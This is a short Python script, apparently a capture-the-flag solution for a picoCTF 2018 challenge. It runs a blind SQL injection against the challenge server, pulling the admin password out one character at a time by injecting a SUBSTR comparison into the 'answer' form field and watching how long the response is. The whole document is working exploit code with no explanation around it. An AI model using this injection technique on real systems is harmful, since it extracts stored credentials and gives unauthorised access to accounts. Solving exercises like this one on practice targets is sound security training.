import requests
url = 'http://2018shell2.picoctf.com:2644/'
for index in range(1, 22):
    for char_number in range(0, 123):
        char = chr(char_number)
        sql = 'admin\' AND SUBSTR((SELECT pass FROM user WHERE id = \'admin\'), {index}, 1) = \'{char}\' --'.format(index = index, char = char)
        payload = {
            'answer' : sql,
        }
        response = requests.post(url, data=payload)
        if len(response.text) > 2000:
            print(char)
            break
print()